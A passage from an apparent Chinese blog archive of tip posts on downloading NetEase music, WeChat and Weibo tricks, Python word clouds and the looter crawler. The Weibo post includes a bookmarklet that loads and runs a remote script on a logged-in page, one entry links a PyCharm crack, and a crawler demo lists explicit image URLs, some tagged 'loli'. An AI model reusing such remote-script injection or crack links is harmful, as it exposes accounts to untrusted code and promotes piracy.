JQ27akNzjFOr5yrGOBGoNlrAric94cqzdirCuQlmAJEj170IhHGKwUuB26pwXZHBahIkaVSjT6hZbrRH2m92SqU8A4qPJ52Actv%252BQsSyupXoGe72T5u1PbKVec%252FeYoVLFQd2EOuBx%252F1U31SCk6rMELTywziJIequBBoPZyAxRkr%252BJvF%252BX6FaqAsr%252BBavVAghDmSHKu3BUKr%252F4ZHqGiQEYlj%252B41EhCuWfEDBDXfZMzyxnoF1d2MzF4YIqMr1xHys7T92PUrJDYtGmEWpdKYphajwwj%252FoNIENKhTSKwDrlD1zaHseNllgnc6Y3VaT7RynUgcvfAfVe47Q1LKayvR9i65UzSoezlHGDsnDpznlI4KgzdoX6pb&amp;autoPlay=true&amp;trackName=超好听的《Something Just Like This》&amp;artistName=苏生不惑&amp;resourceId=457AF908B0426A0321CEF9F02943DB28&amp;coverImg=http://p1.music.126.net/9b_c3yrbFNzCEtnIlBJzgA==/109951163249463194.jpg&amp;restrict=false&amp;width=640&amp;height=400 把前缀hurl= 去掉就是了,但这个地址被编码了，没法直接打开，这时候打开控制台执行decodeURIComponent(地址链接)返回真实的地址http://vodkgeyttp9.vod.126.net/vodkgeyttp8/0J6b5JIi_1396042360_shd.mp4?wsSecret=96dd1b4e0244bfda57c6fdd960c50dcb&amp;wsTime=1558967505&amp;ext=nb0MvQeQKPNcsz96aHpBuzRh0rDbAr30FqKl5vr0I%2BsgZVMShOEX3GBbgnTwSg6aco2Iono%2FRKTn6VFQ4YzRv4kfMaaeHRGI2EJ%2BI38ZQkTi9RzE%2BeABsHu2wMaq8Byasv4tM1RYezJr%2BmpM%2Fy8aYK4ZiGH6vlqbZgLxdDo53hBj3eF4PZyek9PZCoF25cWOumUL0dHJwz0%2BGNJQ27akNzjFOr5yrGOBGoNlrAric94cqzdirCuQlmAJEj170IhHGKwUuB26pwXZHBahIkaVSjT6hZbrRH2m92SqU8A4qPJ52Actv%2BQsSyupXoGe72T5u1PbKVec%2FeYoVLFQd2EOuBx%2F1U31SCk6rMELTywziJIequBBoPZyAxRkr%2BJvF%2BX6FaqAsr%2BBavVAghDmSHKu3BUKr%2F4ZHqGiQEYlj%2B41EhCuWfEDBDXfZMzyxnoF1d2MzF4YIqMr1xHys7T92PUrJDYtGmEWpdKYphajwwj%2FoNIENKhTSKwDrlD1zaHseNllgnc6Y3VaT7RynUgcvfAfVd5OoaoRIYeIqqoe1HxLKa0R54ISLaW31spkfVtI97%2F1&amp;murl=http://vodkgeyttp9.vod.126.net/vodkgeyttp8/oYGrmcJY_1396042360_hd.mp4?wsSecret=faef4ea063513745ac19beb95ad14cb1&amp;wsTime=1558966708&amp;ext=nb0MvQeQKPNcsz96aHpBuzRh0rDbAr30FqKl5vr0I%2BsgZVMShOEX3GBbgnTwSg6aco2Iono%2FRKTn6VFQ4YzRv4kfMaaeHRGI2EJ%2BI38ZQkTi9RzE%2BeABsHu2wMaq8Byasv4tM1RYezJr%2BmpM%2Fy8aYK4ZiGH6vlqbZgLxdDo53hBj3eF4PZyek9PZCoF25cWOumUL0dHJwz0%2BGNJQ27akNzjFOr5yrGOBGoNlrAric94cqzdirCuQlmAJEj170IhHGKwUuB26pwXZHBahIkaVSjT6hZbrRH2m92SqU8A4qPJ52Actv%2BQsSyupXoGe72T5u1PbKVec%2FeYoVLFQd2EOuBx%2F1U31SCk6rMELTywziJIequBBoPZyAxRkr%2BJvF%2BX6FaqAsr%2BBavVAghDmSHKu3BUKr%2F4ZHqGiQEYlj%2B41EhCuWfEDBDXfZMzyxnoF1d2MzF4YIqMr1xHys7T92PUrJDYtGmEWpdKYphajwwj%2FoNIENKhTSKwDrlD1zaHseNllgnc6Y3VaT7RynUgcvfAfVe47Q1LKayvR9i65UzSoezlHGDsnDpznlI4KgzdoX6pb&amp;autoPlay=true&amp;trackName=%E8%B6%85%E5%A5%BD%E5%90%AC%E7%9A%84%E3%80%8ASomething%20Just%20Like%20This%E3%80%8B&amp;artistName=%E8%8B%8F%E7%94%9F%E4%B8%8D%E6%83%91&amp;resourceId=457AF908B0426A0321CEF9F02943DB28&amp;coverImg=http://p1.music.126.net/9b_c3yrbFNzCEtnIlBJzgA==/109951163249463194.jpg&amp;restrict=false&amp;width=640&amp;height=400 打开后直接另存为即可，注意这个地址有失效时间。 命令行下载music-dl支持从网易云音乐、QQ音乐、酷狗音乐、百度音乐、虾米音乐等搜索和下载歌曲,地址 https://github.com/0xHJK/music-dl 使用pip3 install pymusic-dl 安装，这里下载一首赵雷的《南方姑娘》。12345678910111213141516171819202122232425262728293031323334353637383940414243444546λ music-dl --helpUsage: music-dl [OPTIONS] Search and download music from netease, qq, kugou, baidu and xiami. Example: music-dl -k "周杰伦"Options: --version Show the version and exit. -k, --keyword TEXT 搜索关键字 -s, --source TEXT 数据源目前支持qq netease kugou baidu xiami flac -c, --count INTEGER 搜索数量限制 -o, --outdir TEXT 指定输出目录 -x, --proxy TEXT 指定代理（如http://127.0.0.1:1087） -m, --merge 对搜索结果去重和排序（默认不去重） -v, --verbose 详细模式 --help Show this message and exit.λ music-dl -k "赵雷"正在搜索 赵雷 来自 ... FLAC ... KUGOU ... QQ ... NETEASE ... BAIDU ...---------------------------+------+--------------+------+--------+---------+---------------------+---------+| 序号 | 歌名 | 歌手 | 大小 | 时长 | 专辑 | 来源 |+------+--------------+------+--------+---------+---------------------+---------+| 0 | 鼓楼 | 赵雷 | 3.22MB | 0:04:41 | 无法长大 | NETEASE || 1 | 阿刁 | 赵雷 | 5.71MB | 0:06:14 | 无法长大 | KUGOU || 2 | 画 | 赵雷 | 3.48MB | 0:03:48 | 赵小雷 | NETEASE || 3 | 理想 | 赵雷 | 4.79MB | 0:05:13 | 吉姆餐厅 | QQ || 4 | 我们的时光 | 赵雷 | 4.13MB | 0:04:30 | 吉姆餐厅 | QQ || 5 | 成都 | 赵雷 | 5.01MB | 0:05:28 | 无法长大 | KUGOU || 6 | 彩虹下面 | 赵雷 | 4.32MB | 0:04:42 | 西虹市首富 电影原声 | BAIDU || 7 | 南方姑娘 | 赵雷 | 5.11MB | 0:05:34 | 赵小雷 | NETEASE || 8 | 十九岁 | 赵雷 | 3.56MB | 0:03:53 | 十九岁 | BAIDU || 9 | 三十岁的女人 | 赵雷 | 5.01MB | 0:05:28 | 吉姆餐厅 | QQ |+------+--------------+------+--------+---------+---------------------+---------+---------------------------请输入下载序号，支持形如 0 3-5 8 的格式，输入 N 跳过下载 &gt;&gt;: 7 [ 7 ] NETEASE | 0:05:34 - 5.11MB - 赵雷 - 南方姑娘 - 赵小雷下载中... [####################################] 100%已保存到: d:\code\赵雷 - 南方姑娘.mp3-------------请输入要搜索的歌曲，或Ctrl+C退出 还有个网易云音乐、QQ音乐一键下载工具 music-get https://github.com/winterssy/music-get 支持下载单曲，歌单，专辑。 命令行下载网易云视频使用annieannie.exe -f default https://music.163.com/video?id=457AF908B0426A0321CEF9F02943DB28 顺便把mp4用ffmpeg转为mp3格式。 ffmpeg -i &quot;超好听的《Something Just Like This》.mp4&quot; -vn -acodec copy something.mp3 导出歌单可以使用油猴脚本 https://greasyfork.org/zh-CN/scripts/39807-%E5%AF%BC%E5%87%BA%E7%BD%91%E6%98%93%E4%BA%91%E9%9F%B3%E4%B9%90%E6%AD%8C%E5%8D%95 安装有点麻烦，有点怕麻烦可以打开https://music.163.com/#/playlist?id=408195336 然后在控制台执行1copy($$(".m-table tbody b").map(function(item)&#123;return item.title&#125;)) 听全网音乐Listen 1可以搜索和播放来自网易云音乐，虾米，QQ音乐，酷狗音乐，酷我音乐网站的歌曲，让你的曲库更全面。http://listen1.github.io/listen1/我这里下载的是Chrome插件 feeluown播放器（支持 YouTube, NeteaseMusic, QQ， Xiami 等音乐平台）https://github.com/cosven/feeluownChord 弦https://github.com/PeterDing/chord 推荐阅读： 那些你可能不知道的浏览器奇技淫巧 那些你可能不知道的微信奇技淫巧 那些你可能不知道的微博奇技淫巧 Python 网易云音乐批量下载 网易云音乐歌词获取 将网易云音乐下载的NCM格式转换为MP3格式 音乐搜索器 2333音乐搜索器 ncm格式音乐转换教程 moresound.tk 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
        <tag>奇技淫巧</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那些你可能不知道的微信奇技淫巧]]></title>
    <url>%2F2019%2F06%2F10%2F%E9%82%A3%E4%BA%9B%E4%BD%A0%E5%8F%AF%E8%83%BD%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E5%BE%AE%E4%BF%A1%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[微信是我们最常用的 APP 了，今天来说说微信的一些实用技巧。 验证好友是否删除你不用群发好友或者拉群，让微信提示你对方开启了好友验证，很招人烦的。点开对方的对话框，选择转账，输入1元，点击转账， 如果对方已经将你删除，这时会显示【你不是收款方好友】。 当然如果对方拉黑你了，发消息会提示 消息已发出，但被对方拒收了。 电脑客户端用 WeTool 就可以检测 。 挽回转错的钱给微信设置到账时间。选择「支付」，点击右上角的「…」，到「支付管理」，即可设置「转账到账时间」。可以设置为「2 小时到账」或「24 小时到账」，万一你转错了帐还可以挽回。 朋友圈快速回到顶部当刷了好几屏朋友圈之后，轻轻双击顶部立刻回到朋友圈顶部。 长截图微信聊天记录和公众号文章都可以收藏起来以后看，为了防止他人给你发的文件失效，文件也可以收藏起来。 收藏里还有个笔记功能更实用，在【收藏】里点击右上角【+】就可以创建自己的笔记，笔记可以插入文字，图片，音频和视频，然后转发给好友或者朋友圈，这样就实现了朋友圈发语音了。 另外多张图片还有可以保存为图片，这样就实现长截图了。 而且你把笔记置顶后可以在聊天窗口顶部看到，可以当个提醒功能。 快速查找错过的红包在「查找聊天记录」，点击进入找到「交易」，就可以快速找到群里的所有红包了，挨个点吧。 给自己发消息很多人会给 文件传输助手 这个账号发文字或者文件给用来备份。但其实可以发给自己的微信，不用发给文件传输助手，因为之前有人把自己的头像和微信昵称改为「文件传输助手」，然后就可能收到别人发的一些文件。 当然也可以用面对面建群建一个人的群，在群里发。 引用消息并回复群里人太多，你发的消息别人可能不知道是给谁回复的，这就需要引用了，当然这个只能在pc上使用。 搜索朋友圈点击右上角的「搜索」，再点击「朋友圈」，输入自己的微信昵称就可以看到自己发过的朋友圈，还可以按发布时间搜索。 微信提醒在聊天窗口长按聊天内容可以设置多久以后提醒你。 当然还有个官方公众号 语音提醒 给公众号发送语音，到时间会提醒你。 朋友圈发花样字体使用第三方工具 https://beizhedenglong.github.io/weird-fonts/ 找到自己所有的微信群保存到通讯录的群可以在发起群聊里找到，但如果没有保存到通讯录，也没有人在群里发消息怎么能找到那个群呢，打开搜索，输入自己的微信昵称，点击更多群聊就可以找到自己曾经加过的的所有群啦！ pc上查看公众号文章微信官方的搜狗微信 https://weixin.sogou.com/ 二十次幂https://www.ershicimi.com/瓦斯阅读https://qnmlgb.tech/vreadtechhttps://www.vreadtech.com/传送门https://chuansongme.com/ 微信好友图片墙将所有微信好友的头像拼成一张图，具体可以查看之前的文章https://mp.weixin.qq.com/s/GK3fp-cUSeByUrqINGFXHg 还有第三方开发的微信群合影插件 http://www.qunheying.com/ 导出公众号免费公众号采集工具WCplus ，具体使用查看文章 https://shimo.im/docs/dA7ejdOQuPwo7NZV/read吾爱破解论坛牛人的公众号下载工具 https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=641714&amp;page=1 下载该工具需要注册论坛，如果你不方便的话可以在公众号 苏生不惑 发送 公众号下载 获取下载链接 。 当然还有第三方开发的基于搜狗微信搜索的微信公众号爬虫 https://github.com/axiref/WechatSogouhttps://github.com/songluyi/crawl_wechathttps://github.com/leo8916/wxhub 微信防撤回使用微信小助手，不过不建议使用。 导出朋友圈这个需要第三方工具，之前找好友把我的朋友圈都导出来，我把导出的朋友圈放在网页上了，有兴趣可以在我公众号看到。 如果你也想导出朋友圈可以联系我，当然不能保证一定能成功，因为微信可能有调整策略。 当然还有将你的朋友圈出书，比如微信书 https://weixinshu.com/ 最后如果你想了解更多关于微信的最新资讯可以关注官方公众号 微信派 和腾讯。 还有哪些不为人知的微信实用技巧，欢迎留言评论。 推荐阅读：那些你可能不知道的浏览器奇技淫巧 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
        <tag>奇技淫巧</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那些你可能不知道的微博奇技淫巧]]></title>
    <url>%2F2019%2F06%2F10%2F%E9%82%A3%E4%BA%9B%E4%BD%A0%E5%8F%AF%E8%83%BD%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E5%BE%AE%E5%8D%9A%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7%2F</url>
    <content type="text"><![CDATA[微博可能是目前国内最大的公共社交平台了，今天就说说微博的一些使用技巧。 ps：有兴趣可以关注下我的微博@苏生不惑，地址 https://weibo.com/2717930601 如果你想挖我微博的黑历史，那可能要辛苦你了。毕竟我发了8万多条微博。 微博图床所谓图床，就是可以保存图片，同时允许使用图片外链，现在有很多免费的图床服务，如七牛、新浪微博。还有个人开发的http://tool.mkblog.cn/tuchuang/https://www.superbed.cn/当然这些都不大稳定，比如极简图床就挂了https://jiantuku.com/ 微博作为上市公司，所以用微博作图床还是很稳定的，进入微博的微相册 ：http://photo.weibo.com上传图片会生成一个微博图片地址，比如http://wx4.sinaimg.cn/mw690/c08d7e89ly1g3efjakqsaj20hs0b4dgt.jpg新浪微博的图片会上传到ww1-ww4几台服务器上，同时会生成几张不同尺寸的图片，常用的有以下几种形式： http://ww1.sinaimg.cn/thumbnail/c08d7e89ly1g3efjakqsaj20hs0b4dgt.jpg （缩略图）http://ww1.sinaimg.cn/small/c08d7e89ly1g3efjakqsaj20hs0b4dgt.jpg （稍微大点的图）http://ww1.sinaimg.cn/bmiddle/c08d7e89ly1g3efjakqsaj20hs0b4dgt.jpg （再大点的图）http://ww1.sinaimg.cn/large/c08d7e89ly1g3efjakqsaj20hs0b4dgt.jpg（最大的） 当然你直接发微博发张图片也可以的。 为了使用方便，有人开发了微博图床 Chrome 扩展，上传图片到微博更方便了。https://github.com/Semibold/Weibo-Picture-Storehttps://chrome.google.com/webstore/detail/pinjkilghdfhnkibhcangnpmcpdpmehk 通过微博图片找到微博主页一般发微博都有水印的，类似这种图片右下角有@苏生不惑，这就是我的微博昵称，这个昵称是唯一的，所以通过这个昵称可以找到我的主页。 但水印可以关闭的，比如在pc版关闭。 而且微博昵称可以更改，如果昵称改了就找不到对应的人了。 关闭水印后发的图片没有了@，上面这张图片地址是http://wx2.sinaimg.cn/large/604e48d0ly1g3b6wvy3tzj20c80ag0tq.jpg使用在线工具http://www.bejson.com/othertools/pic2weibo/就可以找出微博主页，就是http://weibo.com/u/1615743184这个了。 其实微博地址中的链接后缀 604e48d0ly1g3b6wvy3tzj20c80ag0tq.jpg 前8位604e48d0ly是个16进制，Python用 int(‘604e48d0’,16)转换下到10进制就是1615743184了。 如果想备份你的微博相册，可以使用脚本https://github.com/yukinotech/WeiboDLhttps://github.com/dataabc/weibospiderhttps://github.com/jdeng/weof ###批量删除微博不想用微博了，要删除所有微博，一条条删可是个体力活，推荐使用Chrome 扩展插件档案娘助手 ，能一键删除所有微博、删除所有转发微博、删除所有包含某些关键词的微博、删除某些日期的微博、删除所有收藏的微博、或者将所有微博转为仅自己可见、取消所有点赞微博等等。https://chrome.google.com/webstore/detail/%E6%A1%A3%E6%A1%88%E5%A8%98%E5%8A%A9%E6%89%8B/abfopppplogcojgdcfhhffngkabbhifm?utm_source=chrome-ntp-icon还有专业的 http://weibo333.com/https://www.weibo.com/ttarticle/p/show?id=2309404322284893507202https://www.jianshu.com/p/0e34baf98fce如果不想使用插件，也可以使用第三方脚本来删除。 如果只是删除无用的转发微博（原博已被删除/不可见 等）1javascript:void((function()&#123;var e=document.createElement('script');var ex=document.createElement('script');ex.setAttribute('type', 'application/javascript');ex.setAttribute('src','https://rawcdn.githack.com/ibesty/delete_useless_retweet_weibo/81bda850af482c844fe6e8c73f518a8e4f74fcec/bookmark.js');document.body.appendChild(e);document.body.appendChild(ex);&#125;)()) 右键点击浏览器的书签栏 -&gt; 添加书签 -&gt; 把代码粘贴到网址那一栏，书签标题可以随便写.打开微博网页版 -&gt; 我的主页 -&gt; 全部微博， 然后点击刚刚新建的书签，稍等即可。 对应的脚本还有 https://github.com/willhunger/fuckweibohttps://github.com/Neulana/Xweibo 快捷键输入?可以获取所有快捷键，当然这个其实并没有什么卵用，还是用鼠标方便点。 记录微博到区块链上 发微博@BlockPin ，微博机器人 @BlockPin, 会自动把 @它的消息记录到区块链上。 大致原理是，先发到 https://demo.covenantsql.io/forum/#/ 然后，最多等 1min，记录会在 CovenantSQL 链上确认。刷新页面，然后点击帖子右上角的区块浏览器链接就可以找到 SQLChain 上的记录。 正常时间序现在的微博时间序是错乱的，所以可能会错过一些好友的最新微博动态。可以使用h5版https://m.weibo.cn/也有人开发了让PC微博首页时间线正确排布的插件。https://greasyfork.org/zh-CN/scripts/26247客户端可以使用国际版微博 。 微博热榜想看看今天有什么热门事件，做个吃瓜群众，可以在微博搜索看到https://s.weibo.com/top/summary?cate=realtimehot 还有第三方做的http://www.lzuntalented.cn/tool/wb.html ，每隔15分钟更新。 第三方做的今日热榜https://tophub.today/ 特别关注想第一时间获取关注好友的动态，微博有分组功能，将对方加入特别关注组就行了，微博会及时推送给你。 也有第三方的APP 「即刻」创建相应的微博提醒。 下载微博视频看到不错微博视频想下载，可以使用https://www.weibovideo.com/比如下载这条视频 输入微博地址 https://weibo.com/1875931727/HvMppjjgE就可以获取下载链接，直接下载到本地。还有个更好的下载网站https://weibomiaopai.com/ 好，关于微博就这些了，如果你有更好的一些实用技巧，欢迎留言交流。 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
        <tag>奇技淫巧</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[公众号精选]]></title>
    <url>%2F2019%2F05%2F30%2F%E5%85%AC%E4%BC%97%E5%8F%B7%E7%B2%BE%E9%80%89%2F</url>
    <content type="text"><![CDATA[逻辑思维 markdown编辑器 微信公众号格式化工具https://md.ironmaxi.com/ 让公众号完美显示Latex数学公式 自媒体运营工具 公众号广告 公众号内搜索 动画短片素材网站 公众号视频下载http://www.xmyeditor.com/tools/video.html 重要讲话 实现公众号文章弹幕效果 不用PS，如何在5秒内利用AI工具帮助你自动抠图remove.bg 新媒体工具箱 咪蒙文章大合集一共1013篇密码:hoyv hugo文章 公众号抓取文章 github排行榜 房源密码: faith wenjuan.com/s/7jiyMj/ 公众号Markdown格式化网站 程序员真是太太太太太有趣了 如何使用 Python 爬取微信公众号文章 公众号文章下载项目 Python爬取微信公众号文章并保存为PDF文件 所有工具神器 历史“黑科技” https://mp.weixin.qq.com/s/EtoNa6o0GDuOz8o1mOlK7w 按键精灵 如何优雅的爬取公众号信息 零成本、零流量，我是如何空手反套白狼？ 靠谱的Pycharm汉化安装+破解详细教程 Pycharm汉化+永久激活链接：https://pan.baidu.com/s/1x9oGzsEM0YpHzp6QhUeP-A 提取码：jket 可以一键自动排版至微信公众号、知乎专栏、微博头条、简书、头条号、企鹅号。https://www.mkeditor.com/ https://pan.baidu.com/s/19QBUmlimRhImC6Ugj40UHw#list/path=%2F&amp;parentPath=%2F ，关于文案写作和公众号运营 提取码: tb2x ​​​​ 1.3万字长文拆解：“群勾搭小程序”实现从0到1的3大增长方案 《从零开始学微信运营》读书笔记]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[win8 安装 Python 命令行报错]]></title>
    <url>%2F2019%2F05%2F22%2Fwin8-%E5%AE%89%E8%A3%85-Python-%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%8A%A5%E9%94%99%2F</url>
    <content type="text"><![CDATA[重装了系统，用的是win8 64位。 进入官网,下载最新版3.7.3安装很顺利，但是进入命令行输入Python却一直提示 没有这个文件api-ms-win-crt-runtimel1-1-0.dll于是开始搜索 win8 api-ms-win-crt-runtimel1-1-0.dll ，找到 这篇文章先安装 VC redit.exe也安装成功了。 再安装KB2999226补丁程序 一直提示 真的很无奈，看这篇文章也是无解，都崩溃了。在官网搜索到这个问题依然无解 最后实在无奈了，在sf搜索到 Windows64+Python3+selenium3自动化环境的搭建(1) 终于在这个问题 python3.5启动报错api-ms-win-crt-runtime丢失找到答案 下载了3.4.4版本 终于成功了！]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python 词云分析周杰伦《晴天》]]></title>
    <url>%2F2019%2F05%2F22%2FPython-%E8%AF%8D%E4%BA%91%E5%88%86%E6%9E%90%E5%91%A8%E6%9D%B0%E4%BC%A6%E3%80%8A%E6%99%B4%E5%A4%A9%E3%80%8B%2F</url>
    <content type="text"><![CDATA[词云可以通过网站 https://wordart.com/ 纽扣词云http://cloud.niucodata.com/ 来制作，然而 Python 可以通过代码来实现，下面开始吧。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118pip install wordcloud ,jiebaimport jieba,wordcloud#选取周杰伦的《晴天》歌词mytext = """故事的小黄花从出生那年就飘着童年的荡秋千随记忆一直晃到现在ㄖㄨㄟ ㄙㄡ ㄙㄡ ㄒ一 ㄉㄡ ㄒ一ㄌㄚRe So So Si Do Si Laㄙㄡ ㄌㄚ ㄒ一 ㄒ一 ㄒ一 ㄒ一 ㄌㄚ ㄒ一 ㄌㄚ ㄙㄡSo La Si Si Si Si La Si La So吹着前奏望着天空我想起花瓣试着掉落为你翘课的那一天花落的那一天教室的那一间我怎么看不见消失的下雨天我好想再淋一遍没想到失去的勇气我还留着好想再问一遍你会等待还是离开刮风这天我试过握着你手但偏偏雨渐渐大到我看你不见还要多久我才能在你身边等到放晴的那天也许我会比较好一点从前从前有个人爱你很久但偏偏风渐渐把距离吹得好远好不容易又能再多爱一天但故事的最后你好像还是说了拜拜为你翘课的那一天花落的那一天教室的那一间我怎么看不见消失的下雨天我好想再淋一遍没想到失去的勇气我还留着好想再问一遍你会等待还是离开刮风这天我试过握着你手但偏偏雨渐渐大到我看你不见还要多久我才能在你身边等到放晴的那天也许我会比较好一点从前从前有个人爱你很久偏偏风渐渐把距离吹得好远好不容易又能再多爱一天但故事的最后你好像还是说了拜拜刮风这天我试过握着你手但偏偏雨渐渐大到我看你不见还要多久我才能够在你身边等到放晴那天也许我会比较好一点从前从前有个人爱你很久但偏偏雨渐渐把距离吹得好远好不容易又能再多爱一天但故事的最后你好像还是说了拜"""mytext = " ".join(jieba.cut(mytext))from collections import Counterc = Counter(text_jieba)c = c.most_common(10)[(' ', 522), ('\n', 98), ('你', 19), ('的', 17), ('我', 13), ('好', 10), ('但',8), ('着', 8), ('再', 7), ('ㄒ', 7)]from wordcloud import WordCloudwordcloud = WordCloud(font_path="c:\windows\fonts\simhei.ttf").generate(mytext)import matplotlib.pyplot as pltplt.imshow(wordcloud, interpolation='bilinear')plt.axis("off")plt.show()# 保存图片wordcloud.to_file('test.jpg') 下面进行歌词的情感分析123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566from snownlp import SnowNLPs = SnowNLP(mytext)for sentence in s.sentences: print(sentence)故事 的 小黄花从 出生 那年 就 飘 着童年 的 荡秋千随 记忆 一直 晃到 现在ㄖ ㄨ ㄟ ㄙ ㄡ ㄙ ㄡ ㄒ 一 ㄉ ㄡ ㄒ 一 ㄌ ㄚRe So So Si Do Si Laㄙ ㄡ ㄌ ㄚ ㄒ 一 ㄒ 一 ㄒ 一 ㄒ 一 ㄌ ㄚ ㄒ 一 ㄌ ㄚ ㄙ ㄡSo La Si Si Si Si La Si La So吹 着 前奏 望 着 天空我 想起 花瓣 试着 掉落为 你 翘 课 的 那 一天花落 的 那 一天教室 的 那 一间我 怎么 看不见消失 的 下雨天我 好 想 再 淋 一遍没想到 失去 的 勇气 我 还 留 着好 想 再 问 一遍你 会 等待 还是 离开刮风 这天 我试 过握 着 你 手但 偏偏 雨 渐渐 大到 我 看 你 不见还要 多久 我 才能 在 你 身边等到 放晴 的 那天 也许 我会 比较 好 一点从前 从前 有 个人 爱 你 很 久但 偏偏 风 渐渐 把 距离 吹得 好 远好不容易 又 能 再 多 爱 一天但 故事 的 最后 你 好像 还是 说 了 拜拜为 你 翘 课 的 那 一天花落 的 那 一天教室 的 那 一间我 怎么 看不见消失 的 下雨天我 好 想 再 淋 一遍没想到 失去 的 勇气 我 还 留 着好 想 再 问 一遍你 会 等待 还是 离开刮风 这天 我试 过握 着 你 手但 偏偏 雨 渐渐 大到 我 看 你 不见还要 多久 我 才能 在 你 身边等到 放晴 的 那天 也许 我会 比较 好 一点从前 从前 有 个人 爱 你 很 久偏偏 风 渐渐 把 距离 吹得 好 远好不容易 又 能 再 多 爱 一天但 故事 的 最后 你 好像 还是 说 了 拜拜刮风 这天 我试 过握 着 你 手但 偏偏 雨 渐渐 大到 我 看 你 不见还要 多久 我 才 能够 在 你 身边等到 放晴 那天 也许 我会 比较 好 一点从前 从前 有 个人 爱 你 很 久但 偏偏 雨 渐渐 把 距离 吹得 好 远好不容易 又 能 再 多 爱 一天但 故事 的 最后 你 好像 还是 说 了 拜#第一句的情感分析结果s1 = SnowNLP(s.sentences[0])s1.sentiments0.8849970682062196#正向情感#分析 好不容易 又 能 再 多 爱 一天s1 = SnowNLP(s.sentences[-2])s1.sentiments0.21646625648493734#这个情绪就比较负面了 公众号：苏生不惑]]></content>
      <tags>
        <tag>python</tag>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Pyhon 爬虫框架 looter]]></title>
    <url>%2F2019%2F05%2F22%2FPyhon-%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6-looter%2F</url>
    <content type="text"><![CDATA[知名的pyspider，scrapy就不说了，今天说说这个 looter 安装先安装好python3，需要3.6以上，然后执行 pip install looter123456789101112131415λ looter -hLooter, a python package designed for web crawler lovers :)Author: alphardex QQ:2582347430If any suggestion, please contact me.Thank you for cooperation!Usage: looter genspider &lt;name&gt; [--async] looter shell [&lt;url&gt;] looter (-h | --help | --version)Options: -h --help Show this screen. --version Show version. --async Use async instead of concurrent. 图片爬虫123456789101112131415161718192021222324252627λ looter shell https://konachan.com/postAvailable objects: url The url of the site you crawled. res The response of the site. tree The element source tree to be parsed.Available functions: fetch Send HTTP request to the site and parse it as a tree. [has async version] view View the page in your browser. (test rendering) links Get the links of the page. save Save what you crawled as a file. (json or csv)Examples: Get all the &lt;li&gt; elements of a &lt;ul&gt; table: &gt;&gt;&gt; items = tree.css('ul li') Get the links with a regex pattern: &gt;&gt;&gt; items = links(res, pattern=r'.*/(jpeg|image)/.*')For more info, plz refer to documentation: [looter]: https://looter.readthedocs.io/en/latest/ imgs = tree.css('a.directlink::attr(href)').extract()&gt;&gt;&gt; imgs[1:10]['https://konachan.com/jpeg/c67d38b73df6e32199127998fc0f3338/Konachan.com%20-%20283270%20ass%20bed%20blush%20breasts%20clover_%28sakura_gamer%29%20game_cg%20nipples%20pussy_juice%20red_hair%20sakura_gamer%20wanaca%20winged_cloud.jpg', 'https://konachan.com/image/a0952daaf9aa94cd676901203680fec4/Konachan.com%20-%20283269%20aliasing%20anus%20azur_lane%20blush%20breasts%20cum%20gray_hair%20group%20long_hair%20nipples%20nude%20penis%20pussy%20rak_%28kuraga%29%20red_eyes%20twintails%20uncensored.jpg', 'https://konachan.com/image/e8ea71c93a895d87338ebf17e3aef5b3/Konachan.com%20-%20283268%20aliasing%20anthropomorphism%20azur_lane%20blush%20breasts%20gray_hair%20group%20long_hair%20nipples%20nude%20penis%20pussy%20rak_%28kuraga%29%20red_eyes%20sex%20twintails%20uncensored.jpg', 'https://konachan.com/image/8ffb6f968ffe372ea90a339934a9749d/Konachan.com%20-%20283267%20bed%20blush%20brown_eyes%20brown_hair%20condom%20inanaki_shiki%20long_hair%20navel%20no_bra%20open_shirt%20original%20panties%20tie%20underwear.jpg', 'https://konachan.com/jpeg/0d1de5c59eaf6fc717d63912e076de1d/Konachan.com%20-%20283266%20ass%20bed%20black_hair%20brown_eyes%20long_hair%20matsuzaki_miyuki%20original%20ponytail%20shorts.jpg', 'https://konachan.com/jpeg/7b34654c53e43879f20a8fd642c32acc/Konachan.com%20-%20283264%20aqua_eyes%20bed%20blonde_hair%20blush%20breasts%20censored%20dark_skin%20navel%20nipples%20no_bra%20original%20penis%20pubic_hair%20pussy%20sex%20shirt_lift%20spread_legs%20tan_lines.jpg', 'https://konachan.com/image/00a0eb43c07e9361679b5389e284ef7f/Konachan.com%20-%20283263%20ass%20ball%20brown_eyes%20cameltoe%20dress%20erect_nipples%20gray_hair%20kokkoro%20loli%20panties%20pizanuko%20pointed_ears%20princess_connect%21%20underwear%20upskirt%20wristwear.jpg', 'https://konachan.com/jpeg/889214118e9a891c63f0cb759d809775/Konachan.com%20-%20283262%202girls%20animal%20bow%20brown_eyes%20brown_hair%20clouds%20dress%20feathers%20flowers%20gloves%20green_eyes%20headdress%20idolmaster%20loli%20ribbons%20rose%20short_hair%20sky%20tiara.jpg', 'https://konachan.com/image/c7a3f7f9d6a2c1dc17c4c13733f72aed/Konachan.com%20-%20283261%20bikini_top%20black_hair%20blue_eyes%20boots%20chain%20flat_chest%20gloves%20hoodie%20inosia%20kuroi_mato%20long_hair%20magic%20navel%20scar%20shorts%20signed%20sword%20twintails%20weapon.jpg']Path('konachan.txt').write_text('\n'.join(imgs))wget -i konachan.txt 抓取 v212345678910111213141516171819202122232425262728import timeimport looter as ltfrom pprint import pprintfrom concurrent import futuresdomain = 